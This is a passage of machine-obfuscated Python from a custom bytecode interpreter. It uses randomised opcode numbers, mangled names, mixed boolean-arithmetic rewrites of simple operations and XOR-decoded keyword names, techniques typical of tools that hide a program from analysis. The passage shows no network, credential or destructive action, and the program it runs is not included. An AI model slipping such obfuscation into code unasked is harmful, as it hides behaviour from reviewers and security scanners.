          _d2_0 = getattr(_d1_0, names[8]); _d3_0 = _co[2]; _d4_0 = _co[arg]; stack.append(_d2_0); stack.append(_d3_0); stack.append(_d4_0)
        elif opcode == 3236:
          _b_0_0 = stack.pop()
          while len(fastlocals) <= 0:
            fastlocals.append(None)
          fastlocals[0] = _b_0_0; _n = names[2]
          _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          _b_2_0 = fastlocals[0]; stack.append(_b_1_0); stack.append(_b_2_0)
        elif opcode == 268:
          _args = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _func = stack.pop()
          if isinstance(_func, _types.MethodType) and isinstance(_func.__func__, _nij8gsyo):
            _args = [_func.__self__] + list(_args); _func = _func.__func__
          if isinstance(_func, _nij8gsyo):
            _fl = _ixnhvtom(_func.code, _args, {}, _func.defaults, _func.kw_defaults)
            frame._tz8dlqo3 = _d3kkohtuze(_func.code, _func.globals_dict, fastlocals=_fl, closure=_func.closure, func=_func)
          else:
            stack.append(_func(*_args))
        elif opcode == 3412:
          frame._uid5y5b4b += arg - frame._uid5y5b4b
        elif opcode == 614:
          code_obj = stack.pop(); kw_defaults = stack.pop() if arg & 2 else {}; defaults = stack.pop() if arg & 1 else (); closure = []
          if code_obj.freevars:
            for var in code_obj.freevars:
              if var in frame._klciqhp77v.cellvars:
                closure.append(frame._fib1v1p2[frame._klciqhp77v.cellvars.index(var)])
              elif var in frame._klciqhp77v.freevars:
                closure.append(frame._fib1v1p2[len(frame._klciqhp77v.cellvars) + frame._klciqhp77v.freevars.index(var)])
          fn = _nij8gsyo(code=code_obj, globals_dict=globals_dict, defaults=defaults, kw_defaults=kw_defaults, closure=tuple(closure))
          stack.append(fn)
        elif opcode == 2734:
          right = stack.pop(); left = stack.pop(); stack.append(left <= right)
        elif opcode == 2307:
          stack[-1] = ~stack[-1]
        elif opcode == 3951:
          right = stack.pop(); left = stack.pop(); stack.append(left != right)
        elif opcode == 262:
          val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].add(val)
        elif opcode == 4563:
          _znobalai1a = stack.pop(); _pzaukzuh7 = stack[-1]; cmp_arg = arg
          if arg == 0:
            stack[-1] = _pzaukzuh7 < _znobalai1a
          elif arg == 1:
            stack[-1] = _pzaukzuh7 <= _znobalai1a
          elif arg == 2:
            stack[-1] = _pzaukzuh7 == _znobalai1a
          elif arg == 3:
            stack[-1] = _pzaukzuh7 != _znobalai1a
          elif arg == 4:
            stack[-1] = _pzaukzuh7 > _znobalai1a
          elif arg == 5:
            stack[-1] = _pzaukzuh7 >= _znobalai1a
          elif arg == 6:
            stack[-1] = _pzaukzuh7 in _znobalai1a
          elif arg == 7:
            stack[-1] = _pzaukzuh7 not in _znobalai1a
          elif arg == 8:
            stack[-1] = _pzaukzuh7 is _znobalai1a
          elif arg == 9:
            stack[-1] = _pzaukzuh7 is not _znobalai1a
          elif arg == 10:
            stack[-1] = isinstance(_pzaukzuh7, _znobalai1a) or (isinstance(_pzaukzuh7, type) and issubclass(_pzaukzuh7, _znobalai1a))
        elif opcode == 2470:
          right = stack.pop(); left = stack.pop(); stack.append(left - right)
        elif opcode == 4316:
          _val = stack.pop(); locals_dict[names[arg]] = _val
        elif opcode == 4339:
          right = stack.pop(); left = stack.pop(); stack.append(left + right)
        elif opcode == 4607:
          _a1epnzo3rc, _le3e14776 = stack[-2:]; del stack[-2:]; stack.append(_a1epnzo3rc % _le3e14776)
        elif opcode == 1326:
          _b_chk = None; _b_0_0 = fastlocals[0]; _b_1_obj = _b_0_0; _b_1_val = stack.pop(); setattr(_b_1_obj, names[6], _b_1_val)
          _n = names[4]
          _b_2_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          _b_3_obj = _b_2_0; _b_3_0 = getattr(_b_3_obj, names[7]); _b_4_0 = fastlocals[1]; stack.append(_b_3_0); stack.append(_b_4_0)
        elif opcode == 867:
          _b_chk = None; _n = names[0]
          _b_0_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
          _b_1_0 = _b_0_0; locals_dict[names[1]] = _b_1_0; _b_2_0 = consts[0]; _b_3_0 = _b_2_0; locals_dict[names[2]] = _b_3_0
          _b_4_0 = consts[1]; stack.append(_b_4_0)
        elif opcode == 2260:
          _target = arg; frame._uid5y5b4b = _target
        elif opcode == 3920:
          attr_idx, argc = arg; name = names[attr_idx]; args = stack[-argc:] if argc > 0 else []
          if argc > 0:
            del stack[-argc:]
          obj = stack.pop(); func = getattr(obj, name)
          if isinstance(func, _types.MethodType) and isinstance(func.__func__, _nij8gsyo):
            args = [func.__self__] + list(args); func = func.__func__
          if isinstance(func, _nij8gsyo):
            _fl = _ixnhvtom(func.code, args, {}, func.defaults, func.kw_defaults)
            frame._tz8dlqo3 = _d3kkohtuze(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
          else:
            stack.append(func(*args))
        elif opcode == 170:
          _c4t72lhcs1 = consts[arg]; stack.extend([_c4t72lhcs1])
        elif opcode == 3057:
          _b = stack.pop(); _a = stack.pop(); _res = 2 * (_a & ~_b) - (_a ^ _b) if type(_a) is int and type(_b) is int else _a - _b
          stack.append(_res)
        elif opcode == 3471:
          pass
        elif opcode == 1954:
          if arg == 0:
            stack.append({})
          else:
            _cw0l5e75 = stack[-2 * arg:]; del stack[-2 * arg:]
            _tv5cua3irn = {_cw0l5e75[_ojlb2sozc]: _cw0l5e75[_ojlb2sozc + 1] for _ojlb2sozc in range(0, len(_cw0l5e75), 2)}
            stack.append(_tv5cua3irn)
        elif opcode == 1321:
          if bool(stack[-1]) is False:
            frame._uid5y5b4b = arg
          else:
            del stack[-1]
        elif opcode == 3045:
          _vwbila5y = names[arg]
          if _vwbila5y in locals_dict:
            stack.append(locals_dict[_vwbila5y])
          elif _vwbila5y in globals_dict:
            stack.append(globals_dict[_vwbila5y])
          elif _vwbila5y == 'super':
            def _dffdsxy9z(*args):
              if not args:
                if hasattr(frame, '_cx491lzf') and frame._cx491lzf and hasattr(frame._cx491lzf, '__class_owner__') and frame._rcwi8krk:
                  return _builtins.super(frame._cx491lzf.__class_owner__, frame._rcwi8krk[0])
              return _builtins.super(*args)
            stack.append(_dffdsxy9z)
          elif builtins_dict and _vwbila5y in builtins_dict:
            stack.append(builtins_dict[_vwbila5y])
          else:
            raise NameError(f"name '{_vwbila5y}' is not defined")
        elif opcode == 2056:
          _b_0_0 = stack.pop(); locals_dict[names[1]] = _b_0_0; _b_1_0 = stack.pop()
        elif opcode == 801:
          stack[-3:] = [stack[-1], stack[-3], stack[-2]]
        elif opcode == 2775:
          _b_chk = None; _b_0_0 = stack.pop(); _b_0_res = not _b_0_0; _b_1_0 = _b_0_res; _b_1_res = not _b_1_0; stack.append(_b_1_res)
        elif opcode == 2407:
          right = stack.pop(); left = stack.pop(); stack.append(left * right)
        elif opcode == 3956:
          _b_0_0 = stack.pop()
          while len(fastlocals) <= 3:
            fastlocals.append(None)
          fastlocals[3] = _b_0_0; _b_1_0 = fastlocals[3]; stack.append(_b_1_0)
        elif opcode == 3141:
          stack.append(stack[-1]); _n = names[arg[0]]
          _d1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          _d2_0 = stack.pop(); _d2_res = isinstance(_d2_0, _d1_0) or (isinstance(_d2_0, type) and issubclass(_d2_0, _d1_0))
          _d3_res = not _d2_res; frame._uid5y5b4b = arg[1] if _d3_res else frame._uid5y5b4b
        elif opcode == 1414:
          if frame._d1qdt8v1:
            _b = frame._d1qdt8v1.pop()
            if _b.type == _wlv605g7.WITH:
              frame._ufc87zwsdu = _b.exit_fn
        elif opcode == 4133:
          _val = fastlocals[arg]; stack.append(_val)
        elif opcode == 134:
          val = stack.pop()
          if val:
            frame._uid5y5b4b = arg
        elif opcode == 21:
          name_idx, argc = arg; name = names[name_idx]
          if name == 'super' and argc == 0:
            if hasattr(frame, '_cx491lzf') and frame._cx491lzf and hasattr(frame._cx491lzf, '__class_owner__') and frame._rcwi8krk:
              stack.append(_builtins.super(frame._cx491lzf.__class_owner__, frame._rcwi8krk[0]))
            else:
              stack.append(_builtins.super())
          else:
            func = globals_dict.get(name) or (builtins_dict.get(name) if builtins_dict else getattr(_builtins, name, None))
            args = stack[-argc:] if argc > 0 else []
            if argc > 0:
              del stack[-argc:]
            if isinstance(func, _types.MethodType) and isinstance(func.__func__, _nij8gsyo):
              args = [func.__self__] + list(args); func = func.__func__
            if isinstance(func, _nij8gsyo):
              _fl = _ixnhvtom(func.code, args, {}, func.defaults, func.kw_defaults)
              frame._tz8dlqo3 = _d3kkohtuze(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
            else:
              stack.append(func(*args))
        elif opcode == 1075:
          mod = stack.pop()
          if hasattr(mod, '__all__'):
            for k in mod.__all__:
              locals_dict[k] = getattr(mod, k)
          else:
            for k, v in mod.__dict__.items():
              if not k.startswith('_'):
                locals_dict[k] = v
        elif opcode == 2591:
          _v = stack.pop(); stack.append(not _v)
        elif opcode == 2707:
          stack.extend([frame._fib1v1p2[arg].val])
        elif opcode == 1886:
          stack[-1] = -stack[-1]
        elif opcode == 2004:
          keys = stack.pop(); kw_count = len(keys); pos_count = arg - kw_count; kw_values = stack[-kw_count:] if kw_count > 0 else []
          if kw_count > 0:
            del stack[-kw_count:]
          pos_args = stack[-pos_count:] if pos_count > 0 else []
          if pos_count > 0:
            del stack[-pos_count:]
          func = stack.pop()
          dec_keys = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in keys))
          kwargs = dict(zip(dec_keys, kw_values))
          if isinstance(func, _types.MethodType) and isinstance(func.__func__, _nij8gsyo):
            pos_args = [func.__self__] + list(pos_args); func = func.__func__
          if isinstance(func, _nij8gsyo):
            _fl = _ixnhvtom(func.code, pos_args, kwargs, func.defaults, func.kw_defaults)
            frame._tz8dlqo3 = _d3kkohtuze(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
          else:
            stack.append(func(*pos_args, **kwargs))
        elif opcode == 185:
          try:
            stack.append(next(stack[-1]))
          except StopIteration:
            stack.pop(); frame._uid5y5b4b = arg
        elif opcode == 57:
          _fl = fastlocals; _co = consts; _d0_0 = _fl[1]; _d1_0 = _co[arg]; stack.append(_d0_0); stack.append(_d1_0)
        elif opcode == 3926:
          _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left > right)
        elif opcode == 1079:
          _b = _ipsna1pca(_wlv605g7.FINALLY, arg, len(stack)); frame._d1qdt8v1.append(_b)
        elif opcode == 3601:
          stack.append(fastlocals[arg[0]] * consts[arg[1]])
        elif opcode == 2064:
          _b_chk = None; _b_0_0 = fastlocals[0]; _b_1_obj = _b_0_0; _b_1_val = stack.pop(); setattr(_b_1_obj, names[8], _b_1_val)
        elif opcode == 631:
          _ret = fastlocals[arg]; _qexhl9kb = _ret
          if _md57rb49fw(_qexhl9kb):
            continue
          return _qexhl9kb
        elif opcode == 259:
          _target = arg; frame._uid5y5b4b = _target
        elif opcode == 4132:
          _t0_0 = fastlocals[arg[0]]; _t1_0 = consts[arg[1]]; stack.append(_t0_0); stack.append(_t1_0)
        elif opcode == 1015:
          _lw9x0bsvc0 = stack.pop(-1); _qexhl9kb = _lw9x0bsvc0
          if _md57rb49fw(_qexhl9kb):
            continue
          return _qexhl9kb
        elif opcode == 497:
          _av204ih9vy = stack.pop(); _q469jrym6 = stack.pop(); stack.append(_q469jrym6 >> _av204ih9vy)
        elif opcode == 3483:
          _n = names[13]
          _b_0_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          _b_1_0 = consts[44]; stack.append(_b_0_0); stack.append(_b_1_0)
        elif opcode == 1616:
          _val = stack.pop(); locals_dict[names[arg]] = _val
        elif opcode == 4588:
          stack[-1:] = []
        elif opcode == 162:
          _d_tmp = None; right = stack.pop(); left = stack.pop()
          stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
        elif opcode == 3246:
          name = names[arg]
          if name in globals_dict:
            del globals_dict[name]
          else:
            raise NameError(f"name '{name}' is not defined")
        elif opcode == 2729:
          _r = stack.pop(); stack[-1] = stack[-1] | _r
        elif opcode == 3254:
          if arg == 0:
            stack.append([])
          else:
            _dot2qghk = []; _dot2qghk.extend(stack[-arg:]); del stack[-arg:]; stack.append(_dot2qghk)
        elif opcode == 3755:
          _b_chk = None; _b_0_obj = stack.pop(); _b_0_0 = getattr(_b_0_obj, names[4]); _n = names[5]
          _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          _b_2_0 = fastlocals[2]; stack.append(_b_0_0); stack.append(_b_1_0); stack.append(_b_2_0)
        elif opcode == 26:
          pass
        elif opcode == 3042:
          stack[-1] = iter(stack[-1])
        elif opcode == 906:
          _lw9x0bsvc0 = stack.pop(); _qexhl9kb = _lw9x0bsvc0
          if _md57rb49fw(_qexhl9kb):
            continue
          return _qexhl9kb
        elif opcode == 4142:
          left = fastlocals[arg[0]]; right = consts[arg[1]]; cmp_arg = arg[2]; res = False
          if cmp_arg == 0:
            res = left < right
          elif cmp_arg == 1:
            res = left <= right
          elif cmp_arg == 2:
            res = left == right
          elif cmp_arg == 3:
            res = left != right
          elif cmp_arg == 4:
            res = left > right
          elif cmp_arg == 5:
            res = left >= right
          elif cmp_arg == 6:
            res = left in right
          elif cmp_arg == 7:
            res = left not in right
          elif cmp_arg == 8:
            res = left is right
          elif cmp_arg == 9:
            res = left is not right
          elif cmp_arg == 10:
            res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
          stack.append(res)
        elif opcode == 1686:
          _b_chk = None; _n = names[3]
          _b_1_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
          stack.append(_b_1_0)
        elif opcode == 642:
          name = names[arg]; obj = stack.pop(); delattr(obj, name)
        elif opcode == 4715:
          key = stack.pop(); obj = stack.pop(); del obj[key]
        elif opcode == 4046:
          if bool(stack[-1]) is True:
            frame._uid5y5b4b = arg
          else:
            del stack[-1]
        elif opcode == 1369:
          stack[-1] = tuple(stack[-1])
        elif opcode == 4206:
          _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left == right)
        elif opcode == 1343:
          fastlocals[arg] = None
        elif opcode == 1344:
          kwargs = stack.pop() if arg & 1 else {}; args = stack.pop(); func = stack.pop()
          if isinstance(func, _types.MethodType) and isinstance(func.__func__, _nij8gsyo):
            args = tuple([func.__self__] + list(args)); func = func.__func__
          if isinstance(func, _nij8gsyo):
            _fl = _ixnhvtom(func.code, args, kwargs, func.defaults, func.kw_defaults)
            frame._tz8dlqo3 = _d3kkohtuze(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
          else:
            stack.append(func(*args, **kwargs))
        elif opcode == 1827:
          right = stack.pop(); left = stack.pop(); stack.append(left ** right)
        elif opcode == 1046:
          _r = stack.pop(); stack[-1] = stack[-1] / _r
        elif opcode == 3780:
          args = stack[-arg:] if arg > 0 else []
          if arg > 0:
            del stack[-arg:]
          func = stack.pop()
          if isinstance(func, _types.MethodType) and isinstance(func.__func__, _nij8gsyo):
            args = [func.__self__] + list(args); func = func.__func__
          if isinstance(func, _nij8gsyo):
            _fl = _ixnhvtom(func.code, args, {}, func.defaults, func.kw_defaults)
            frame._tz8dlqo3 = _d3kkohtuze(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
          else:
            stack.append(func(*args))
        elif opcode == 1651:
          _a = fastlocals[arg[0]]; _b = consts[arg[1]]
          frame._st99omuow = (frame._st99omuow * 1103515245 + 12345 ^ (_a if type(_a) is int else 0)) & 4294967295
          stack.append((_a ^ _b) + 2 * (_a & _b) if type(_a) is int and type(_b) is int else _a + _b)
        elif opcode == 1397:
          _v = stack.pop()
          while len(fastlocals) <= arg:
            fastlocals += [None]
          fastlocals[arg] = _v
        elif opcode == 941:
          _cc7mfetv = stack.pop(); _uagmjhdy = stack.pop()
          stack.append(_cc7mfetv + _uagmjhdy if type(_uagmjhdy) is int and type(_cc7mfetv) is int else _uagmjhdy + _cc7mfetv)
        elif opcode == 1661:
          if arg == 2:
            upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper))
          elif arg == 3:
            step = stack.pop(); upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper, step))
        elif opcode == 2595:
          _lw9x0bsvc0 = stack[-1]; del stack[-1]; _qexhl9kb = _lw9x0bsvc0
          if _md57rb49fw(_qexhl9kb):
            continue
          return _qexhl9kb
        elif opcode == 1298:
          seq = list(stack.pop())
          if len(seq) != arg:
            raise ValueError(f'need more than {len(seq)} values to unpack (expected {arg})')
          for item in reversed(seq):
            stack.append(item)
        elif opcode == 4781:
          _b_chk = None; _b_0_0 = stack.pop(); locals_dict[names[4]] = _b_0_0; _b_1_0 = consts[3]; stack.append(_b_1_0)
        elif opcode == 3650:
          _b_0_0 = consts[4]; _b_1_0 = _b_0_0; _b_1_res = -_b_1_0; stack.append(_b_1_res)
        elif opcode == 187:
          _qexhl9kb = consts.__getitem__(arg)
          if _md57rb49fw(_qexhl9kb):
            continue
          return _qexhl9kb
        elif opcode == 4614:
          _t0_0 = consts[arg[0]]; _t1_0 = consts[arg[1]]; stack.append(_t0_0); stack.append(_t1_0)
        elif opcode == 2398:
          _d_v2 = None; _d0_obj = stack.pop(); _d0_0 = getattr(_d0_obj, names[arg[0]]); _d1_0 = consts[arg[1]]; _d2_0 = consts[arg[2]]
          stack.append(_d0_0); stack.append(_d1_0); stack.append(_d2_0)
        elif opcode == 933:
          right = stack.pop(); left = stack.pop(); stack.append(left >= right)
        elif opcode == 1647:
          _zjgb41f34p = stack.pop(); _bd3x5fhbrw = stack.pop(); stack.append(_bd3x5fhbrw << _zjgb41f34p)
        elif opcode == 3514:
          _n = names[arg]; _l = locals_dict
          if _n in _l:
            stack.append(_l[_n])
          elif _n in globals_dict:
            stack.append(globals_dict[_n])
          elif _n == 'super':
            def _dffdsxy9z(*args):
              if not args:
                if hasattr(frame, '_cx491lzf') and frame._cx491lzf and hasattr(frame._cx491lzf, '__class_owner__') and frame._rcwi8krk:
                  return _builtins.super(frame._cx491lzf.__class_owner__, frame._rcwi8krk[0])
              return _builtins.super(*args)
            stack.append(_dffdsxy9z)
          elif builtins_dict and _n in builtins_dict:
            stack.append(builtins_dict[_n])
          else:
            raise NameError(f"name '{_n}' is not defined")
        elif opcode == 2123:
          _vwbila5y = names[arg]; _xj84p2gny = locals_dict
          if _vwbila5y in _xj84p2gny:
            stack.append(_xj84p2gny[_vwbila5y])
          elif _vwbila5y in globals_dict:
            stack.append(globals_dict[_vwbila5y])
          elif _vwbila5y == 'super':
            def _dffdsxy9z(*args):
              if not args:
                if hasattr(frame, '_cx491lzf') and frame._cx491lzf and hasattr(frame._cx491lzf, '__class_owner__') and frame._rcwi8krk:
                  return _builtins.super(frame._cx491lzf.__class_owner__, frame._rcwi8krk[0])
              return _builtins.super(*args)
            stack.append(_dffdsxy9z)
          elif builtins_dict and _vwbila5y in builtins_dict:
            stack.append(builtins_dict[_vwbila5y])
          else:
            raise NameError(f"name '{_vwbila5y}' is not defined")
        elif opcode == 1201:
          _val = stack.pop()
          if bool(_val) is False:
            frame._uid5y5b4b = arg
        elif opcode == 4802:
          stack.extend(stack[-2:])
        elif opcode == 4104:
          _cc7mfetv = stack.pop(); _uagmjhdy = stack.pop()
          _pfm3hurs = (_uagmjhdy ^ _cc7mfetv ^ 2 * (_uagmjhdy & _cc7mfetv)) + 2 * ((_uagmjhdy ^ _cc7mfetv) & 2 * (_uagmjhdy & _cc7mfetv)) if type(_uagmjhdy) is int and type(_cc7mfetv) is int else _uagmjhdy + _cc7mfetv
          stack.append(_pfm3hurs)
        elif opcode == 1692:
          val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].extend(val)
        elif opcode == 3619:
          _v = stack.pop(); stack.append(+_v)
        elif opcode == 30:
          _x1gjsub9 = stack.pop(); _zm2rc9ao = stack.pop()
          frame._st99omuow = (frame._st99omuow * 1103515245 + 12345 ^ (_zm2rc9ao if type(_zm2rc9ao) is int else 0)) & 4294967295
          _ee324obc = (_zm2rc9ao | _x1gjsub9) - (_zm2rc9ao & _x1gjsub9) if type(_zm2rc9ao) is int and type(_x1gjsub9) is int else _zm2rc9ao ^ _x1gjsub9
          stack.append(_ee324obc)
        elif opcode == 1674:
          cmp_arg, target_pc = arg; right = stack.pop(); left = stack.pop(); res = False
          if cmp_arg == 0:
            res = left < right
          elif cmp_arg == 1:
            res = left <= right
          elif cmp_arg == 2:
            res = left == right
          elif cmp_arg == 3:
            res = left != right
          elif cmp_arg == 4:
            res = left > right
          elif cmp_arg == 5:
            res = left >= right
          elif cmp_arg == 6:
            res = left in right
          elif cmp_arg == 7:
            res = left not in right
          elif cmp_arg == 8:
            res = left is right
          elif cmp_arg == 9:
            res = left is not right
          elif cmp_arg == 10:
            res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
          if not res:
            frame._uid5y5b4b = target_pc
        elif opcode == 809:
          _n = names[13]
          _b_0_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          _b_1_0 = consts[37]; stack.append(_b_0_0); stack.append(_b_1_0)
        elif opcode == 4481:
          _b_0_0 = stack.pop()
          while len(fastlocals) <= 6:
            fastlocals.append(None)
          fastlocals[6] = _b_0_0; _n = names[4]
          _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          _b_2_obj = _b_1_0; _b_2_0 = getattr(_b_2_obj, names[11]); _b_3_0 = fastlocals[2]; _b_4_0 = fastlocals[4]; stack.append(_b_2_0)
          stack.append(_b_3_0); stack.append(_b_4_0)
        elif opcode == 1193:
          _flp4qgtk = names[arg]; _bhlmef5u = globals_dict
          if _flp4qgtk in _bhlmef5u:
            _iuanef7lh = _bhlmef5u[_flp4qgtk]; stack.append(_iuanef7lh)
          elif _flp4qgtk == 'super':
            def _dffdsxy9z(*args):
              if not args:
                if hasattr(frame, '_cx491lzf') and frame._cx491lzf and hasattr(frame._cx491lzf, '__class_owner__') and frame._rcwi8krk:
                  return _builtins.super(frame._cx491lzf.__class_owner__, frame._rcwi8krk[0])
              return _builtins.super(*args)
            stack.append(_dffdsxy9z)
          elif builtins_dict and _flp4qgtk in builtins_dict:
            stack.append(builtins_dict[_flp4qgtk])
          else:
            raise NameError(f"name '{_flp4qgtk}' is not defined")
        elif opcode == 3268:
          if arg == 0:
            stack.append(tuple())
          else:
            _items = tuple([stack.pop() for _ in range(arg)][::-1]); stack.append(_items)
        elif opcode == 985:
          _dqisqr5cjw = stack.pop(); globals_dict[names[arg]] = _dqisqr5cjw
        elif opcode == 572:
          fromlist = stack.pop(); level = stack.pop(); name = consts[arg]
          import_func = builtins_dict.get('__import__', _builtins.__import__) if builtins_dict else _builtins.__import__
          stack.append(import_func(name, globals_dict, locals_dict, fromlist, level))
        elif opcode == 553:
          _rd34gr6md = stack.pop()
          if not not _rd34gr6md:
            frame._uid5y5b4b = arg
        elif opcode == 2592:
          _pnm9s1n4 = names[arg]
          if _pnm9s1n4 in locals_dict:
            locals_dict.pop(_pnm9s1n4)
          else:
            raise NameError(f"name '{_pnm9s1n4}' is not defined")
        elif opcode == 4370:
          _b_0_0 = stack.pop(); locals_dict[names[2]] = _b_0_0; _b_1_0 = consts[6]; stack.append(_b_1_0)
        elif opcode == 1276:
          stack.extend(stack[-1:])
        elif opcode == 3091:
          frame._uid5y5b4b = arg if not stack[-1] else frame._uid5y5b4b
        elif opcode == 2531:
          _tk4gtka6 = stack.pop(); _sm5fdsk5p = stack.pop()
          stack.append(_tk4gtka6 * _sm5fdsk5p if type(_sm5fdsk5p) is int and type(_tk4gtka6) is int else _sm5fdsk5p * _tk4gtka6)
        elif opcode == 4351:
          stack.append(fastlocals[arg[0]] + fastlocals[arg[1]])
        elif opcode == 4360:
          _l7375f6a7 = stack.pop(); stack[-1] = stack[-1] // _l7375f6a7
        elif opcode == 2110:
          stack += [consts[arg]]
        elif opcode == 2670:
          val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].update(val)
        elif opcode == 3013:
          globals_dict[names[arg]] = stack.pop()
        elif opcode == 1428:
          right = stack.pop(); left = stack.pop(); stack.append(left - right)
        elif opcode == 2691:
          stack.append(consts[arg])
        elif opcode == 2852:
          stack[-2] = stack[-2] << stack[-1]; stack.pop()
        elif opcode == 1758:
          frame._uid5y5b4b += arg - frame._uid5y5b4b
        elif opcode == 4775:
          _oxz544b57 = stack.pop()
          if arg >= len(fastlocals):
            fastlocals.extend([None] * (arg - len(fastlocals) + 1))
          fastlocals[arg] = _oxz544b57
        elif opcode == 4724:
          _a, _b = stack[-2:]; del stack[-2:]; stack.append(_a | _b)
        elif opcode == 3754:
          stack[-1:] = []
        elif opcode == 2912:
          _flp4qgtk = names[arg]
          if _flp4qgtk == 'super':
            def _dffdsxy9z(*args):
              if not args:
                if hasattr(frame, '_cx491lzf') and frame._cx491lzf and hasattr(frame._cx491lzf, '__class_owner__') and frame._rcwi8krk:
                  return _builtins.super(frame._cx491lzf.__class_owner__, frame._rcwi8krk[0])
              return _builtins.super(*args)
            stack.append(_dffdsxy9z)
          else:
            _iuanef7lh = globals_dict.get(_flp4qgtk, builtins_dict.get(_flp4qgtk) if builtins_dict else None)
            if _iuanef7lh is None and _flp4qgtk not in globals_dict and (not builtins_dict or _flp4qgtk not in builtins_dict):
              raise NameError(f"name '{_flp4qgtk}' is not defined")
            stack.append(_iuanef7lh)
        elif opcode == 136:
          if bool(stack[-1]) is True:
            frame._uid5y5b4b = arg
        elif opcode == 815:
          val = stack.pop(); key = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth][key] = val
        elif opcode == 4678:
          _d_tmp = None; _t0_1 = stack.pop(); _t0_0 = stack.pop(); _t0_res = _t0_0 != _t0_1; _t1_0 = _t0_res; _t1_res = not _t1_0
          stack.append(_t1_res)
        elif opcode == 1495:
          _fl = fastlocals; _co = consts; _d0_0 = _co[arg[0]]; _d1_0 = _co[arg[1]]; stack.append(_d0_0); stack.append(_d1_0)
        elif opcode == 2705:
          _d_tmp = None; _t0_0 = fastlocals[arg[0]]; _t1_0 = fastlocals[arg[1]]; stack.append(_t0_0); stack.append(_t1_0)
        elif opcode == 910:
          _b_0_0 = stack.pop(); _n = names[4]
          _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
          stack.append(_b_1_0)
        elif opcode == 4167:
          if not stack.pop():
            frame._uid5y5b4b = arg
        elif opcode == 4551:
          _r = stack.pop(); stack[-1] = stack[-1] % _r
        elif opcode == 2460:
          _oukb4zf6, _q4qcp9k13k = (stack.pop(), stack.pop()); setattr(_oukb4zf6, names[arg], _q4qcp9k13k)
        elif opcode == 3676:
          _oxz544b57 = stack.pop()
          while len(fastlocals) <= arg:
            fastlocals += [None]
          fastlocals[arg] = _oxz544b57
        elif opcode == 4925:
          _b_chk = None; _b_0_0 = stack.pop(); locals_dict[names[3]] = _b_0_0; _n = names[4]
          _b_1_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
          _b_2_0 = consts[7]; _b_3_1 = _b_2_0; _b_3_0 = _b_1_0; _b_4_1 = _b_3_0; _b_4_0 = _b_3_1; _b_4_res = _b_4_0 == _b_4_1
          stack.append(_b_4_res)
        elif opcode == 4791:
          _d_tmp = None; _t0_0 = stack.pop()
          while len(fastlocals) <= arg[0]:
            fastlocals.append(None)
          fastlocals[arg[0]] = _t0_0; _t1_0 = fastlocals[arg[1]]; stack.append(_t1_0)
        elif opcode == 155:
          _flp4qgtk = names[arg]; _bhlmef5u = globals_dict
          if _flp4qgtk in _bhlmef5u:
            _iuanef7lh = _bhlmef5u[_flp4qgtk]; stack.append(_iuanef7lh)
          elif _flp4qgtk == 'super':
            def _dffdsxy9z(*args):
              if not args:
                if hasattr(frame, '_cx491lzf') and frame._cx491lzf and hasattr(frame._cx491lzf, '__class_owner__') and frame._rcwi8krk:
                  return _builtins.super(frame._cx491lzf.__class_owner__, frame._rcwi8krk[0])
              return _builtins.super(*args)
            stack.append(_dffdsxy9z)
          elif builtins_dict and _flp4qgtk in builtins_dict:
            stack.append(builtins_dict[_flp4qgtk])
          else:
            raise NameError(f"name '{_flp4qgtk}' is not defined")
        elif opcode == 783:
          const_idx, var_idx = arg
          while len(fastlocals) <= var_idx:
            fastlocals.append(None)
          fastlocals[var_idx] = consts[const_idx]
        elif opcode == 4023:
          right = stack.pop(); left = stack.pop(); cmp_arg = arg
          if arg == 0:
            stack.append(left < right)
          elif arg == 1:
            stack.append(left <= right)
          elif arg == 2:
            stack.append(left == right)
          elif arg == 3:
            stack.append(left != right)
          elif arg == 4:
            stack.append(left > right)
          elif arg == 5:
            stack.append(left >= right)
          elif arg == 6:
            stack.append(left in right)
          elif arg == 7:
            stack.append(left not in right)
          elif arg == 8:
            stack.append(left is right)
          elif arg == 9:
            stack.append(left is not right)
